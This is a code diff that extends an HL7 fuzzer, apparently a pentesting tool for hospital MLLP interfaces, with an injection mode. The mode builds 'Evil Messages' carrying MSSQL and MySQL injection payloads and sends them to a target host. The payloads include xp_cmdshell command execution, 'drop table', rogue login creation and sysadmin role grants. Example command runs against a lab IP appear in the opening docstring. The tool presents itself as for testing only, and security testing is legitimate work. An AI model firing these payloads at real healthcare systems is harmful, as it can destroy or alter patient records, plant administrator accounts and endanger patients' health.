@@ -1,3 +1,53 @@
+'''
+hl7_fuzzer
+Never use hl7_fuzzer in production Environment, you may seriously harm peoples health!!! hl7_fuzzer is for testing purpose only.
+The main purpose of hl7_fuzzer is to find which messages are accepted and acknowledged with "AA" by a MLLP Server.
+
+It's also possible to use any of the available payloads: MySQL, MSSQL
+hl7_fuzzer will build "Evil Messages" and send them to the MLLP Server.
+
+Check out this site if you need more Message templates:
+http://www.mieweb.com/wiki/Sample_HL7_Messages#MDM.5ET02
+
+Don't have a test Environment yet? Use this tools:
+http://smarthl7.com/
+
+Special thanks to this great project:
+https://python-hl7.readthedocs.io/en/latest/
+
+Example usage fuzz mode with builtin mode:
+root@kali:~# python hl7_fuzz.py 192.168.188.3 1234 fuzz -p high
+[+] Start payload high
+[+] Starting MLLP sender
+[+] Message type accepted: ADT = Admit Discharge Transfer
+...
+[+] Finished sending 4 messages.
+
+Example usage fuzz mode with hl7 file input:
+root@kali:~# python hl7_fuzz.py 192.168.188.3 1234 fuzz -p custom -f /root/test.hl7
+[+] Start payload custom
+[+] Starting MLLP sender
+[+] Message type accepted: ADT = Admit Discharge Transfer
+[+] Finished sending /root/test.hl7.
+
+Example usage injection mode with builtin payload:
+root@kali:~# python hl7_fuzz.py 192.168.188.3 1234 inject -p MSSQL -i PID.5.1
+[+] Starting injection
+[+] Starting message builder
+[+] Starting MLLP sender
+[+] Message type accepted: ADT = Admit Discharge Transfer
+...
+
+Example usage injection mode with custom payload:
+root@kali:~# python hl7_fuzz.py 192.168.188.3 1234 inject -p custom -i PID.5.1
+[+] Starting injection
+Enter your payload: 'This is a really Evil String'
+[+] Starting message builder
+[+] Starting MLLP sender
+[+] Message type accepted: ADT = Admit Discharge Transfer
+...
+
+'''
 import hl7
 import datetime
 import time
@@ -67,38 +117,133 @@ def mostCommon():
 	"SIU" : "Scheduling Information Unsolicited"}
 	return messageTypes
 
+#payloads from https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection/detect
+def mssqlDetect():
+	payload = ["'; exec master..xp_cmdshell 'ping 10.10.1.2'--",
+	"'create user name identified by 'pass123' --",
+	"'create user name identified by pass123 temporary tablespace temp default tablespace users;",
+	"' ; drop table temp --",
+	"'exec sp_addlogin 'name' , 'password' --",
+	"' exec sp_addsrvrolemember 'name' , 'sysadmin' --",
+	"' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",
+	"' grant connect to name; grant resource to name; --",
+	"' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",
+	"' or 1=1 --",
+	"' union (select @@version) --",
+	"' union (select NULL, (select @@version)) --",
+	"' union (select NULL, NULL, (select @@version)) --",
+	"' union (select NULL, NULL, NULL,  (select @@version)) --",
+	"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",
+	"' union (select NULL, NULL, NULL, NULL, NULL, (select @@version)) --"]
+	return payload
+
+def mysqlDetect():
+	payload = ["1'1",
+	"1 exec sp_ (or exec xp_)",
+	"1 and 1=1",
+	"1' and 1=(select count(*) from tablenames); --",
+	"1 or 1=1",
+	"1' or '1'='1",
+	"1or1=1",
+	"1'or'1'='1",
+	"fake@ema'or'il.nl'='il.nl"]
+	return payload
+
+#Use this if you want to, create your own payload
+'''
+def xyz():
+	payload = []
+	return payload
+'''
+
+#get actual Time
 def getTime():
 	ts = time.time()
 	st = datetime.datetime.fromtimestamp(ts).strftime('%Y%m%d%H%M%S')
 	return st
 
+#send message to host and port, check if response is "AA" which means message acceptedd
 def mllpSender(host, port, message):
 	try:
-		h = hl7.parse(message)
+		print "[+] Starting MLLP sender"
+		if type(message) is str: 
+			h = hl7.parse(message)
+		else:
+			h = message
 		messageType = mostCommon()
 		with hl7.client.MLLPClient(host, port) as client:
-			result = client.send_message(message)
-			r = hl7.parse(result)
+			response = client.send_message(message)
+			r = hl7.parse(response)
 			if str(r[1][1]) == "AA": 
 				print "[+] Message type accepted: " + str(h[0][9][0][0]) + " = " + messageType[str(h[0][9][0][0])]
 			else: pass
 	except:
 		print "[-] MLLP sending failed."
 		sys.exit()
-		
+
+#Create messages for most common message types, only MSH segment
 def levelOne(host, port):
 	messageTypes = ["ADT", "BAR", "DFT", "MDM", "MFN", "ORM", "ORU", "QRY", "RAS", "RDE", "RGV", "SIU"]
 	for messageType in messageTypes:
 		message = 'MSH|^~\&|HISSERVER|HISVENDOR|FUZZER|TEST|%s||%s^A01|MSG123|P|2.3||||AL|\r'%(getTime(), messageType)
 		mllpSender(host, port, message)
 	print "[+] Finished sending %s messages."%len(messageTypes)
+	sys.exit()
 
+#Create messages from builtin message types
 def levelTwo(host, port):
 	messages = [adtSample(), ormSample(), oruSample(), dftSample()]
 	for message in messages:
 		mllpSender(host, port, message)
 	print "[+] Finished sending %s messages."%len(messages)
+	sys.exit()			
 
+#Build evilMessages for injection mode, with defined payload and injection point
+def messageBuilder(message, payload, injectPoint):
+	print "[+] Starting message builder"
+	h = hl7.parse(message)
+	split = injectPoint.split('.')
+	try:
+		h.segments(split[0])[0][int(split[1])][0][int(split[2])][0] = payload
+	except:
+		print "[-] Something went wrong"
+		sys.exit()
+	return h
+
+#Injection mode
+def injection(host, port, message, payloadType, injectPoint):
+	print "[+] Starting injection"
+	if message == "ADT":
+		message = adtSample()
+	elif message == "ORM":
+		message = ormSample()
+	elif message == "ORU":
+		message = oruSample()
+	elif message == "DFT":
+		message = dftSample()
+	else:
+		print "[-] Invalid message selected."
+		sys.exit()
+	if payloadType == "MSSQL":
+		for payload in mssqlDetect():
+			evilMessage = messageBuilder(message, payload, injectPoint)
+			mllpSender(host, port, evilMessage)
+	if payloadType == "MYSQL":
+		for payload in mysqlDetect():
+			evilMessage = messageBuilder(message, payload, injectPoint)
+			mllpSender(host, port, evilMessage)
+	#Use this if you want to, inject your own payload
+	'''
+	if payloadType == "XYZ":
+		for payload in xyz():
+			evilMessage = messageBuilder(message, payload, injectPoint)
+			mllpSender(host, port, evilMessage)
+	'''
+	if payloadType == "custom":
+		payload = raw_input('Enter your payload: ')
+		evilMessage = messageBuilder(message, payload, injectPoint)
+		mllpSender(host, port, evilMessage)
+	
 def fuzzer():
 	script_name = os.path.basename(sys.argv[0])
 	parser = argparse.ArgumentParser()
@@ -111,12 +256,24 @@ def fuzzer():
 		help='port to connect to'
 	)
 	parser.add_argument(
-		'level', type=str,
-		help='"low", "high", "custom" for hl7 file input'
+		'mode', type=str,
+		help='"fuzz" determine accetped Messages, "inject" inject payload'
 	)
 	parser.add_argument(
 		'-f', '--file', dest='filename',
 		help='path to hl7 file'
+	)
+	parser.add_argument(
+		'-p', '--payload', dest='payload',
+		help='"MSSQL", "MYSQL", "custom", "low", "high"'
+	)
+	parser.add_argument(
+		'-i', '--inject', dest='inject',
+		help='for example: "PID.5.1" = Firstname'
+	)
+	parser.add_argument(
+		'-m', '--message', dest='messageSelect',
+		help='"ADT", "ORM", "ORU", "DFT"'
 	)
 	args = parser.parse_args()
 	if len(sys.argv) < 2:
@@ -124,21 +281,31 @@ def fuzzer():
 		sys.exit()
 	if args.host is not None:
 		if args.port is not None:
-			if args.level == "low":
-				print "[+] Start level low"
-				levelOne(args.host,args.port)
-			elif args.level == "high":
-				print "[+] Start level high"
-				levelTwo(args.host,args.port)
-			elif args.level == "custom":
-				if args.filename is not None:
-					with open(args.filename, 'rb') as f:
-						stream = f.read()
-						print "[+] Start level custom"
-						mllpSender(args.host, args.port, stream)
-						print "[+] Finished sending %s." %args.filename
+			if args.mode == "fuzz":
+				if args.payload == "low":
+					print "[+] Start payload low"
+					levelOne(args.host,args.port)
+				elif args.payload == "high":
+					print "[+] Start payload high"
+					levelTwo(args.host,args.port)
+				elif args.payload == "custom":
+					if args.filename is not None:
+						with open(args.filename, 'rb') as f:
+							stream = f.read()
+							print "[+] Start payload custom"
+							mllpSender(args.host, args.port, stream)
+							print "[+] Finished sending %s." %args.filename
+							sys.exit()
+				else :"[-] Invalid payload selected."; sys.exit()
+				
+			if args.mode == "inject":
+				if args.payload is not None:
+					if args.inject is not None:
+						if args.messageSelect is not None:
+							injection(args.host, args.port, args.messageSelect, args.payload, args.inject)
 			else:
-				print "[-] Invalid Mode selected."
-
+				print "[-] Invalid mode selected."
+				sys.exit()
+	
 if __name__ == '__main__':
 	fuzzer()
